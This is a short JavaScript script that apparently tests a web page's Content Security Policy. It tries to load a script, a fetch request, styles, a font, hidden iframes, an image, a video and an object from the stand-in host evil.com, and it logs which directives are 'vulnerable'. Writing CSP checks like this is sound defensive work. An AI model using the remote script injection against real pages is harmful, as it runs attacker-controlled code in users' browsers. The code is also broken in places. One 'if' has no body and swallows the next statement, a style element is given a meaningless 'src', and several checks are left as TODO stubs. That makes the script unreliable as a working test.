var evilUrl = 'http://evil.com/gotcha';
console.log('running CSP attacks...');

Promise.resolve().then(() => {

  // connect-src
  return fetch(new Request(evilUrl))
    .then(() => console.error('connect-src vulnerable'))
    .catch(() => {});

}).then(() => {

  return new Promise((resolve, reject) => {
    var script = document.createElement('script');
    script.async = true;
    script.src = evilUrl;
    script.addEventListener('load', resolve);
    script.addEventListener('error', () => reject('Error loading script.'));
    script.addEventListener('abort', () => reject('Script loading aborted.'));
    document.head.appendChild(script);
  })
  .then(() => console.error('script-src vulnerable'))
  .catch(err => console.log(err));

}).then(() => {

  // style-src
  var numStyles = document.styleSheets.length;
  var style = document.createElement('style');
  style.type = 'text/css';
  style.src = evilUrl;
  document.head.appendChild(style);
  if (document.styleSheets.length > numStyles)
    console.error('style-src vulnerable');

  // font-src
  console.log('TODO font-src');
  var newStyle = document.createElement('style');
  newStyle.appendChild(document.createTextNode('@font-face { font-family: "owned"; src: url("'+evilUrl+'") format("otf"); }'));
  document.head.appendChild(newStyle);
  if (document.styleSheets.length > numStyles)

  // frame-src
  console.log('TODO frame-src');
  var iframe = document.createElement('iframe');
  iframe.style.display = "none";
  iframe.src = evilUrl;
  document.body.appendChild(iframe);

  // frame-ancestors
  console.log('TODO frame-ancestors');
  var iframe = document.createElement('iframe');
  iframe.style.display = "none";
  iframe.src = window.location.href;
  document.body.appendChild(iframe);

  // img-src
  console.log('TODO img-src');
  var img = document.createElement("img");
  img.src = evilUrl;
  document.body.appendChild(img);

  // media-src
  console.log('TODO media-src');
  var video = document.createElement('video');
  video.src = evilUrl;
  video.autoPlay = true;
  document.body.appendChild(video);

  // object-src
  console.log('TODO object-src'); 
  var object = document.createElement('object');
  object.data = evilUrl;
  document.body.appendChild(object);

});
